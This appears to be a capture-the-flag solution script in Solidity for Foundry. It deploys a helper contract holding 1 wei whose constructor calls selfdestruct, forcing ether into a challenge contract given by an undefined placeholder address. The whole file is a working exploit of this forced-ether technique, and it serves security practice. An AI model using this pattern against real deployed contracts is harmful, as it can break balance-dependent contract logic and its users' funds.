// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        new ForceAttacker{value: 1 wei}(payable(your_challenge_address));
        
        vm.stopBroadcast();
    }
}

contract ForceAttacker {

    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
} 